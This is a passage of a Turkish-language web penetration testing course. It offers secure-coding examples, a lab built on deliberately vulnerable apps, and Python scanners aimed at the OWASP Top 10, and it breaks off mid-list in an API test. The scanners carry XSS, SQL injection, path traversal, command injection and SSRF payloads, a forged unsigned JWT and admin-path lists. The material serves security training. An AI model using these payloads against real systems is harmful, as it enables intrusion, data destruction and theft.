# 🌐 Web Uygulama Penetrasyon Testi

## 📖 İçindekiler
- [Giriş](#giriş)
- [Öğrenme Hedefleri](#öğrenme-hedefleri)
- [Gerçek Dünya Uygulamaları](#gerçek-dünya-uygulamaları)
- [Teorik Temeller](#teorik-temeller)
- [Teknik Detaylar](#teknik-detaylar)
- [Uygulamalı Laboratuvar](#uygulamalı-laboratuvar)
- [Pratik Egzersizler](#pratik-egzersizler)
- [Kod Örnekleri](#kod-örnekleri)
- [Önerilen Araçlar](#önerilen-araçlar)
- [Yapılandırma En İyi Uygulamaları](#yapılandırma-en-iyi-uygulamaları)
- [Gerçek Dünya Vaka Çalışmaları](#gerçek-dünya-vaka-çalışmaları)
- [Değerlendirme ve Doğrulama](#değerlendirme-ve-doğrulama)
- [İleri Konular](#ileri-konular)
- [Kaynaklar ve Referanslar](#kaynaklar-ve-referanslar)

## 🎯 Giriş

Web uygulama penetrasyon testi, web uygulamalarındaki güvenlik açıklarını sistematik olarak tespit etmek ve değerlendirmek için kullanılan kritik bir siber güvenlik disiplinidir. Modern dijital dünyada web uygulamaları, işletmelerin ve organizasyonların temel altyapısını oluşturduğu için, bu uygulamaların güvenliği hayati önem taşımaktadır.

### 🌟 Neden Önemli?

- **Yaygın Saldırı Vektörü**: Web uygulamaları en yaygın saldırı hedefleridir
- **Veri İhlali Riski**: Hassas verilerin korunması kritiktir
- **İş Sürekliliği**: Güvenlik açıkları iş operasyonlarını durdurabilir
- **Uyumluluk Gereksinimleri**: Yasal ve düzenleyici standartları karşılama
- **Marka İtibarı**: Güvenlik ihlalleri marka güvenilirliğini zedeler

## 🎯 Öğrenme hedefleri

Bu modülü tamamladıktan sonra şunları yapabileceksiniz:

### 📚 Teorik Bilgi
- Web uygulama güvenlik açıklarını kategorize etme
- OWASP Top 10 zafiyetlerini detaylı anlama
- Web uygulama mimarilerini güvenlik perspektifinden analiz etme
- Penetrasyon testi metodolojilerini uygulama

### 🛠️ Pratik Beceriler
- Kapsamlı web uygulama güvenlik değerlendirmesi yapma
- Otomatik ve manuel test tekniklerini birleştirme
- Güvenlik açıklarını exploit etme ve impact analizi
- Profesyonel penetrasyon testi raporları hazırlama

### 🔧 Teknik Yetkinlikler
- Burp Suite, OWASP ZAP gibi araçları etkin kullanma
- Custom payload ve exploit geliştirme
- Web teknolojilerini derinlemesine anlama
- Güvenlik testlerini otomatikleştirme

## 🌍 Gerçek Dünya Uygulamaları

### 💼 Endüstri Kullanım Alanları

**E-ticaret Platformları**
- Ödeme sistemi güvenliği
- Kullanıcı veri koruması
- Session yönetimi
- API güvenliği

**Finansal Hizmetler**
- Online banking güvenliği
- Fraud detection sistemleri
- PCI DSS uyumluluğu
- Multi-factor authentication

**Sağlık Sektörü**
- HIPAA uyumluluğu
- Hasta veri güvenliği
- Telemedicine platformları
- Medical device interfaces

**Devlet ve Kamu Sektörü**
- Citizen services portals
- Digital identity management
- Critical infrastructure protection
- Data sovereignty

## 📚 Teorik Temeller

### 🏗️ Web Uygulama Mimarisi Güvenliği

#### Client-Side Security
```javascript
// Güvenli client-side validation örneği
class SecureValidator {
    static validateInput(input, type) {
        const patterns = {
            email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
            phone: /^\+?[1-9]\d{1,14}$/,
            alphanumeric: /^[a-zA-Z0-9]+$/
        };
        
        // Input sanitization
        const sanitized = this.sanitizeInput(input);
        
        // Pattern validation
        if (patterns[type]) {
            return patterns[type].test(sanitized);
        }
        
        return false;
    }
    
    static sanitizeInput(input) {
        return input
            .replace(/[<>"'&]/g, '')
            .trim()
            .substring(0, 255);
    }
    
    static encodeOutput(output) {
        return output
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    }
}
```

#### Server-Side Security
```python
# Güvenli server-side implementation
import hashlib
import secrets
import jwt
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

class SecureWebApp:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = secrets.token_hex(32)
        self.setup_security_headers()
        self.setup_routes()
    
    def setup_security_headers(self):
        @self.app.after_request
        def add_security_headers(response):
            response.headers['X-Content-Type-Options'] = 'nosniff'
            response.headers['X-Frame-Options'] = 'DENY'
            response.headers['X-XSS-Protection'] = '1; mode=block'
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
            response.headers['Content-Security-Policy'] = "default-src 'self'"
            return response
    
    def generate_csrf_token(self):
        return secrets.token_urlsafe(32)
    
    def validate_csrf_token(self, token, session_token):
        return secrets.compare_digest(token, session_token)
    
    def create_jwt_token(self, user_id):
        payload = {
            'user_id': user_id,
            'exp': datetime.utcnow() + timedelta(hours=1),
            'iat': datetime.utcnow()
        }
        return jwt.encode(payload, self.app.config['SECRET_KEY'], algorithm='HS256')
    
    def validate_jwt_token(self, token):
        try:
            payload = jwt.decode(token, self.app.config['SECRET_KEY'], algorithms=['HS256'])
            return payload['user_id']
        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None
```

### 🔍 OWASP Top 10 Detaylı Analiz

#### A01:2021 – Broken Access Control
```python
# Güvenli access control implementation
from functools import wraps
from flask import session, abort

def require_permission(permission):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if 'user_id' not in session:
                abort(401)  # Unauthorized
            
            user_permissions = get_user_permissions(session['user_id'])
            if permission not in user_permissions:
                abort(403)  # Forbidden
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def get_user_permissions(user_id):
    # Database query to get user permissions
    # Implementation depends on your permission model
    pass

# Usage example
@app.route('/admin/users')
@require_permission('admin.users.read')
def list_users():
    return jsonify(get_all_users())
```

#### A02:2021 – Cryptographic Failures
```python
# Güvenli kriptografik implementation
import bcrypt
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os

class SecureCrypto:
    @staticmethod
    def hash_password(password):
        salt = bcrypt.gensalt(rounds=12)
        return bcrypt.hashpw(password.encode('utf-8'), salt)
    
    @staticmethod
    def verify_password(password, hashed):
        return bcrypt.checkpw(password.encode('utf-8'), hashed)
    
    @staticmethod
    def generate_encryption_key(password, salt=None):
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt
    
    @staticmethod
    def encrypt_data(data, key):
        f = Fernet(key)
        return f.encrypt(data.encode())
    
    @staticmethod
    def decrypt_data(encrypted_data, key):
        f = Fernet(key)
        return f.decrypt(encrypted_data).decode()
```

#### A03:2021 – Injection
```python
# SQL Injection korunması
import sqlite3
from contextlib import contextmanager

class SecureDatabase:
    def __init__(self, db_path):
        self.db_path = db_path
    
    @contextmanager
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        try:
            yield conn
        finally:
            conn.close()
    
    def get_user_by_id(self, user_id):
        # Güvenli parameterized query
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, email FROM users WHERE id = ?",
                (user_id,)
            )
            return cursor.fetchone()
    
    def search_users(self, search_term):
        # Güvenli LIKE query with input validation
        if not search_term or len(search_term) > 50:
            return []
        
        # Input sanitization
        sanitized_term = search_term.replace('%', '\\%').replace('_', '\\_')
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, email FROM users WHERE username LIKE ? ESCAPE '\\'",
                (f"%{sanitized_term}%",)
            )
            return cursor.fetchall()
```

## 🔧 Teknik Detaylar

### 🕷️ Web Crawling ve Reconnaissance

```python
# Gelişmiş web crawler
import requests
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import time
import random

class WebAppRecon:
    def __init__(self, target_url, max_depth=3):
        self.target_url = target_url
        self.max_depth = max_depth
        self.visited_urls = set()
        self.found_endpoints = set()
        self.found_parameters = set()
        self.technologies = set()
        self.session = requests.Session()
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
    
    def crawl(self, url=None, depth=0):
        if url is None:
            url = self.target_url
        
        if depth > self.max_depth or url in self.visited_urls:
            return
        
        try:
            response = self.session.get(url, timeout=10)
            self.visited_urls.add(url)
            
            # Technology detection
            self.detect_technologies(response)
            
            # Extract endpoints and parameters
            self.extract_endpoints(response.text, url)
            
            # Find links for further crawling
            if depth < self.max_depth:
                links = self.extract_links(response.text, url)
                for link in links:
                    time.sleep(random.uniform(0.5, 2.0))  # Rate limiting
                    self.crawl(link, depth + 1)
        
        except Exception as e:
            print(f"Error crawling {url}: {e}")
    
    def detect_technologies(self, response):
        headers = response.headers
        content = response.text
        
        # Server detection
        if 'Server' in headers:
            self.technologies.add(f"Server: {headers['Server']}")
        
        # Framework detection
        frameworks = {
            'Django': r'csrfmiddlewaretoken',
            'Laravel': r'laravel_session',
            'Express.js': r'X-Powered-By.*Express',
            'ASP.NET': r'__VIEWSTATE',
            'PHP': r'\.php',
            'WordPress': r'wp-content'
        }
        
        for framework, pattern in frameworks.items():
            if re.search(pattern, content, re.IGNORECASE):
                self.technologies.add(framework)
    
    def extract_endpoints(self, content, base_url):
        # Extract forms
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action', '')
            if action:
                endpoint = urljoin(base_url, action)
                self.found_endpoints.add(endpoint)
                
                # Extract form parameters
                inputs = form.find_all(['input', 'select', 'textarea'])
                for input_elem in inputs:
                    name = input_elem.get('name')
                    if name:
                        self.found_parameters.add(name)
        
        # Extract JavaScript endpoints
        js_endpoints = re.findall(r'["\']([/\w\-\.]+\.(?:php|asp|aspx|jsp|do|action))["\']', content)
        for endpoint in js_endpoints:
            full_endpoint = urljoin(base_url, endpoint)
            self.found_endpoints.add(full_endpoint)
    
    def extract_links(self, content, base_url):
        soup = BeautifulSoup(content, 'html.parser')
        links = set()
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            
            # Only follow links within the same domain
            if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                links.add(full_url)
        
        return links
    
    def generate_report(self):
        report = {
            'target': self.target_url,
            'visited_urls': len(self.visited_urls),
            'endpoints': list(self.found_endpoints),
            'parameters': list(self.found_parameters),
            'technologies': list(self.technologies)
        }
        return report
```

### 🎯 Vulnerability Scanner

```python
# Kapsamlı vulnerability scanner
import requests
import re
from urllib.parse import urljoin
import json

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = self.load_payloads()
    
    def load_payloads(self):
        return {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; DROP TABLE users; --",
                "1' UNION SELECT NULL,NULL,NULL--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '/etc/passwd',
                'C:\\windows\\system32\\drivers\\etc\\hosts'
            ],
            'command_injection': [
                '; ls -la',
                '| whoami',
                '& dir',
                '; cat /etc/passwd',
                '`id`'
            ]
        }
    
    def scan_xss(self, url, parameters):
        for param in parameters:
            for payload in self.payloads['xss']:
                test_data = {param: payload}
                
                try:
                    # GET request
                    response = self.session.get(url, params=test_data)
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'severity': 'High'
                        })
                    
                    # POST request
                    response = self.session.post(url, data=test_data)
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'POST',
                            'severity': 'High'
                        })
                
                except Exception as e:
                    continue
    
    def scan_sqli(self, url, parameters):
        for param in parameters:
            for payload in self.payloads['sqli']:
                test_data = {param: payload}
                
                try:
                    response = self.session.post(url, data=test_data)
                    
                    # SQL error patterns
                    sql_errors = [
                        r'SQL syntax.*MySQL',
                        r'Warning.*mysql_.*',
                        r'valid MySQL result',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*pg_.*',
                        r'valid PostgreSQL result',
                        r'Microsoft Access Driver',
                        r'Microsoft JET Database',
                        r'Oracle error',
                        r'Oracle.*Driver',
                        r'SQLite.*error'
                    ]
                    
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': error_pattern,
                                'severity': 'Critical'
                            })
                            break
                
                except Exception as e:
                    continue
    
    def scan_lfi(self, url, parameters):
        for param in parameters:
            for payload in self.payloads['lfi']:
                test_data = {param: payload}
                
                try:
                    response = self.session.get(url, params=test_data)
                    
                    # LFI indicators
                    lfi_indicators = [
                        r'root:.*:0:0:',
                        r'\[boot loader\]',
                        r'\[operating systems\]'
                    ]
                    
                    for indicator in lfi_indicators:
                        if re.search(indicator, response.text, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'Local File Inclusion',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            })
                            break
                
                except Exception as e:
                    continue
    
    def scan_security_headers(self, url):
        try:
            response = self.session.get(url)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options header',
                'X-XSS-Protection': 'Missing X-XSS-Protection header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing CSP header'
            }
            
            for header, message in security_headers.items():
                if header not in headers:
                    self.vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'url': url,
                        'description': message,
                        'severity': 'Medium'
                    })
        
        except Exception as e:
            pass
    
    def generate_report(self):
        report = {
            'target': self.target_url,
            'scan_date': str(datetime.now()),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities_by_severity': {
                'Critical': len([v for v in self.vulnerabilities if v.get('severity') == 'Critical']),
                'High': len([v for v in self.vulnerabilities if v.get('severity') == 'High']),
                'Medium': len([v for v in self.vulnerabilities if v.get('severity') == 'Medium']),
                'Low': len([v for v in self.vulnerabilities if v.get('severity') == 'Low'])
            },
            'vulnerabilities': self.vulnerabilities
        }
        return report
```

## 🧪 Uygulamalı Laboratuvar

### 🏗️ Test Ortamı Kurulumu

```bash
#!/bin/bash
# Web Application Pentest Lab Setup

echo "Setting up Web Application Penetration Testing Lab..."

# Update system
sudo apt update && sudo apt upgrade -y

# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh
sudo usermod -aG docker $USER

# Install Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/download/v2.20.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose

# Create lab directory
mkdir -p ~/web-pentest-lab
cd ~/web-pentest-lab

# Download vulnerable applications
git clone https://github.com/WebGoat/WebGoat.git
git clone https://github.com/digininja/DVWA.git
git clone https://github.com/ethicalhack3r/DVWA.git
git clone https://github.com/OWASP/NodeGoat.git

# Create docker-compose for vulnerable apps
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    environment:
      - MYSQL_ROOT_PASSWORD=password
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=password
  
  webgoat:
    image: webgoat/goatandwolf
    ports:
      - "8081:8080"
      - "9090:9090"
  
  mutillidae:
    image: citizenstig/nowasp
    ports:
      - "8082:80"
  
  juice-shop:
    image: bkimminich/juice-shop
    ports:
      - "8083:3000"
  
  nodegoat:
    image: owasp/nodegoat
    ports:
      - "8084:4000"
EOF

# Start vulnerable applications
docker-compose up -d

echo "Lab setup complete!"
echo "Access points:"
echo "DVWA: http://localhost:8080"
echo "WebGoat: http://localhost:8081/WebGoat"
echo "Mutillidae: http://localhost:8082"
echo "OWASP Juice Shop: http://localhost:8083"
echo "NodeGoat: http://localhost:8084"
```

### 🔧 Burp Suite Konfigürasyonu

```python
# Burp Suite API automation
import requests
import json
import time

class BurpSuiteAPI:
    def __init__(self, api_url="http://127.0.0.1:1337", api_key=None):
        self.api_url = api_url
        self.api_key = api_key
        self.session = requests.Session()
        if api_key:
            self.session.headers.update({'X-API-Key': api_key})
    
    def start_scan(self, target_url, scan_type="crawl_and_audit"):
        data = {
            "urls": [target_url],
            "scan_type": scan_type
        }
        
        response = self.session.post(
            f"{self.api_url}/burp/scanner/scans/active",
            json=data
        )
        
        if response.status_code == 201:
            return response.json()['task_id']
        else:
            raise Exception(f"Failed to start scan: {response.text}")
    
    def get_scan_status(self, task_id):
        response = self.session.get(
            f"{self.api_url}/burp/scanner/scans/{task_id}"
        )
        return response.json()
    
    def get_scan_issues(self, task_id):
        response = self.session.get(
            f"{self.api_url}/burp/scanner/scans/{task_id}/issues"
        )
        return response.json()
    
    def export_scan_report(self, task_id, report_type="HTML"):
        data = {
            "report_type": report_type,
            "include_false_positives": False
        }
        
        response = self.session.post(
            f"{self.api_url}/burp/scanner/scans/{task_id}/report",
            json=data
        )
        
        return response.content

# Usage example
def automated_burp_scan(target_url):
    burp = BurpSuiteAPI()
    
    print(f"Starting scan for {target_url}")
    task_id = burp.start_scan(target_url)
    
    # Wait for scan completion
    while True:
        status = burp.get_scan_status(task_id)
        if status['scan_status'] == 'finished':
            break
        print(f"Scan progress: {status.get('scan_progress', 0)}%")
        time.sleep(30)
    
    # Get issues
    issues = burp.get_scan_issues(task_id)
    print(f"Found {len(issues)} issues")
    
    # Export report
    report = burp.export_scan_report(task_id)
    with open(f"burp_report_{task_id}.html", "wb") as f:
        f.write(report)
    
    return issues
```

## 🎯 Pratik Egzersizler

### Egzersiz 1: OWASP Top 10 Kapsamlı Test

```python
# OWASP Top 10 automated testing framework
import requests
import re
from urllib.parse import urljoin
import json
from datetime import datetime

class OWASPTop10Tester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = {
            'A01_Broken_Access_Control': [],
            'A02_Cryptographic_Failures': [],
            'A03_Injection': [],
            'A04_Insecure_Design': [],
            'A05_Security_Misconfiguration': [],
            'A06_Vulnerable_Components': [],
            'A07_Authentication_Failures': [],
            'A08_Software_Data_Integrity': [],
            'A09_Security_Logging_Monitoring': [],
            'A10_Server_Side_Request_Forgery': []
        }
    
    def test_broken_access_control(self):
        """A01:2021 – Broken Access Control"""
        test_cases = [
            '/admin',
            '/admin/',
            '/administrator',
            '/admin.php',
            '/admin/index.php',
            '/admin/login.php',
            '/admin/admin.php',
            '/admin_area/admin.php',
            '/admin_area/login.php',
            '/siteadmin/login.php',
            '/siteadmin/index.php',
            '/adminpanel/index.php',
            '/admincontrol/login.php',
            '/admin/account.php',
            '/admin/index.html',
            '/admin/login.html',
            '/admin/home.php',
            '/admin_area/index.php',
            '/bb-admin/index.php',
            '/bb-admin/login.php',
            '/bb-admin/admin.php',
            '/admin/controlpanel.php',
            '/admincp/index.asp',
            '/admincp/login.asp',
            '/admincp/index.html',
            '/admin/account.html',
            '/adminpanel/login.php',
            '/admin/admin_login.php',
            '/admin_login.php',
            '/panel-administracion/login.php',
            '/admin/cp.php',
            '/cp.php',
            '/administrator/index.php',
            '/administrator/login.php',
            '/nsw/admin/login.php',
            '/webadmin/login.php',
            '/admin/admin_login.html',
            '/admin_login.html',
            '/admin/adminLogin.php',
            '/adminLogin.php',
            '/admin/admin.html',
            '/admin.html',
            '/admincp/index.php',
            '/admin/admincp.php',
            '/admincp.php',
            '/admin/secure/index.php',
            '/admin/secure/login.php',
            '/admin/secure/admin.php',
            '/admins.php',
            '/admins.html',
            '/administr8.php',
            '/administr8.html',
            '/webadmin/index.php',
            '/webadmin/admin.php',
            '/webadmin/login.html',
            '/admin/admin_login.asp',
            '/admin_login.asp',
            '/admin/secure/index.html',
            '/admin/secure/login.html',
            '/admin/secure/admin.html'
        ]
        
        for path in test_cases:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    # Check for admin panel indicators
                    admin_indicators = [
                        'admin panel', 'administration', 'control panel',
                        'dashboard', 'login', 'username', 'password'
                    ]
                    
                    content_lower = response.text.lower()
                    if any(indicator in content_lower for indicator in admin_indicators):
                        self.results['A01_Broken_Access_Control'].append({
                            'url': url,
                            'status_code': response.status_code,
                            'description': 'Potentially accessible admin panel',
                            'severity': 'High'
                        })
            
            except Exception as e:
                continue
    
    def test_cryptographic_failures(self):
        """A02:2021 – Cryptographic Failures"""
        try:
            response = self.session.get(self.target_url)
            
            # Check for HTTP instead of HTTPS
            if self.target_url.startswith('http://'):
                self.results['A02_Cryptographic_Failures'].append({
                    'url': self.target_url,
                    'description': 'Site uses HTTP instead of HTTPS',
                    'severity': 'High'
                })
            
            # Check for weak SSL/TLS
            if self.target_url.startswith('https://'):
                import ssl
                import socket
                from urllib.parse import urlparse
                
                parsed_url = urlparse(self.target_url)
                hostname = parsed_url.hostname
                port = parsed_url.port or 443
                
                context = ssl.create_default_context()
                with socket.create_connection((hostname, port)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cipher = ssock.cipher()
                        if cipher and cipher[1] in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                            self.results['A02_Cryptographic_Failures'].append({
                                'url': self.target_url,
                                'description': f'Weak SSL/TLS version: {cipher[1]}',
                                'severity': 'High'
                            })
        
        except Exception as e:
            pass
    
    def test_injection(self):
        """A03:2021 – Injection"""
        # SQL Injection payloads
        sql_payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--"
        ]
        
        # XSS payloads
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")></iframe>'
        ]
        
        # Test common parameters
        test_params = ['id', 'user', 'search', 'q', 'query', 'name', 'email', 'username']
        
        for param in test_params:
            # Test SQL Injection
            for payload in sql_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Check for SQL errors
                    sql_errors = [
                        r'SQL syntax.*MySQL',
                        r'Warning.*mysql_.*',
                        r'PostgreSQL.*ERROR',
                        r'Microsoft Access Driver',
                        r'Oracle error'
                    ]
                    
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            self.results['A03_Injection'].append({
                                'url': self.target_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'SQL Injection',
                                'severity': 'Critical'
                            })
                            break
                
                except Exception as e:
                    continue
            
            # Test XSS
            for payload in xss_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    if payload in response.text:
                        self.results['A03_Injection'].append({
                            'url': self.target_url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'High'
                        })
                
                except Exception as e:
                    continue
    
    def test_security_misconfiguration(self):
        """A05:2021 – Security Misconfiguration"""
        try:
            response = self.session.get(self.target_url)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection missing',
                'X-XSS-Protection': 'XSS protection header missing',
                'X-Content-Type-Options': 'MIME type sniffing protection missing',
                'Strict-Transport-Security': 'HSTS header missing',
                'Content-Security-Policy': 'CSP header missing',
                'Referrer-Policy': 'Referrer policy missing'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    self.results['A05_Security_Misconfiguration'].append({
                        'url': self.target_url,
                        'description': description,
                        'severity': 'Medium'
                    })
            
            # Check for information disclosure
            if 'Server' in headers:
                server_header = headers['Server']
                if any(tech in server_header.lower() for tech in ['apache', 'nginx', 'iis']):
                    self.results['A05_Security_Misconfiguration'].append({
                        'url': self.target_url,
                        'description': f'Server information disclosed: {server_header}',
                        'severity': 'Low'
                    })
        
        except Exception as e:
            pass
    
    def test_ssrf(self):
        """A10:2021 – Server-Side Request Forgery"""
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://169.254.169.254',  # AWS metadata
            'file:///etc/passwd',
            'file:///c:/windows/system32/drivers/etc/hosts'
        ]
        
        test_params = ['url', 'link', 'src', 'source', 'target', 'redirect', 'uri']
        
        for param in test_params:
            for payload in ssrf_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Check for SSRF indicators
                    ssrf_indicators = [
                        'root:x:0:0:',  # /etc/passwd content
                        'localhost',
                        '127.0.0.1',
                        'ami-id',  # AWS metadata
                        'instance-id'
                    ]
                    
                    for indicator in ssrf_indicators:
                        if indicator in response.text:
                            self.results['A10_Server_Side_Request_Forgery'].append({
                                'url': self.target_url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            })
                            break
                
                except Exception as e:
                    continue
    
    def run_all_tests(self):
        """Run all OWASP Top 10 tests"""
        print("Starting OWASP Top 10 security tests...")
        
        self.test_broken_access_control()
        print("✓ A01: Broken Access Control test completed")
        
        self.test_cryptographic_failures()
        print("✓ A02: Cryptographic Failures test completed")
        
        self.test_injection()
        print("✓ A03: Injection test completed")
        
        self.test_security_misconfiguration()
        print("✓ A05: Security Misconfiguration test completed")
        
        self.test_ssrf()
        print("✓ A10: Server-Side Request Forgery test completed")
        
        return self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive test report"""
        total_issues = sum(len(issues) for issues in self.results.values())
        
        report = {
            'target': self.target_url,
            'test_date': datetime.now().isoformat(),
            'total_issues': total_issues,
            'results': self.results,
            'summary': {
                category: len(issues) 
                for category, issues in self.results.items()
            }
        }
        
        return report

# Usage example
if __name__ == "__main__":
    target = "http://localhost:8080"  # DVWA
    tester = OWASPTop10Tester(target)
    report = tester.run_all_tests()
    
    # Save report
    with open(f"owasp_top10_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\nTest completed. Found {report['total_issues']} issues.")
    for category, count in report['summary'].items():
        if count > 0:
            print(f"{category}: {count} issues")
```

### Egzersiz 2: API Security Testing

```python
# API Security Testing Framework
import requests
import json
import jwt
from datetime import datetime, timedelta
import base64
import hashlib

class APISecurityTester:
    def __init__(self, api_base_url):
        self.api_base_url = api_base_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities = []
        self.endpoints = []
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        common_paths = [
            '/api/v1',
            '/api/v2',
            '/api',
            '/rest',
            '/graphql',
            '/swagger.json',
            '/openapi.json',
            '/api-docs',
            '/docs'
        ]
        
        for path in common_paths:
            try:
                url = f"{self.api_base_url}{path}"
                response = self.session.get(url)
                
                if response.status_code == 200:
                    self.endpoints.append(url)
                    
                    # Check for API documentation
                    if 'swagger' in response.text.lower() or 'openapi' in response.text.lower():
                        self.parse_api_documentation(response.json())
            
            except Exception as e:
                continue
    
    def parse_api_documentation(self, doc):
        """Parse Swagger/OpenAPI documentation"""
        try:
            if 'paths' in doc:
                for path, methods in doc['paths'].items():
                    full_path = f"{self.api_base_url}{path}"
                    self.endpoints.append(full_path)
        except Exception as e:
            pass
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        auth_bypass_tests = [
            # JWT manipulation
            {
                'name': 'JWT None Algorithm',
                'headers': {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.'}
            },
            # SQL injection in auth
            {
                'name': 'SQL Injection in Auth',
                'data': {'username': "admin' OR '1'='1' --", 'password': 'password'}
            },
            # Default credentials
            {
                'name': 'Default Credentials',
                'data': {'username': 'admin', 'password': 'admin'}
            }
        ]
        
        for endpoint in self.endpoints:
            for test in auth_bypass_tests:
                try:
                    if 'headers' in test:
                        response = self.session.get(endpoint, headers=test['headers'])
                    elif 'data' in test:
                        response = self.session.post(f"{endpoint}/login", json=test['data'])
                    
                    if response.status_code == 200 and 'token' in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'Authentication Bypass',
                            'endpoint': endpoint,
                            'test': test['name'],
                            'severity': 'Critical'
                        })
                
                except Exception as e:
                    continue
    
    def test_authorization_flaws(self):
        """Test for authorization vulnerabilities"""
        # Test for IDOR (Insecure Direct Object References)
        idor_endpoints = [
            '/api/users/1',
            '/api/users/2',
            '/api/orders/1',
            '/api/orders/2',
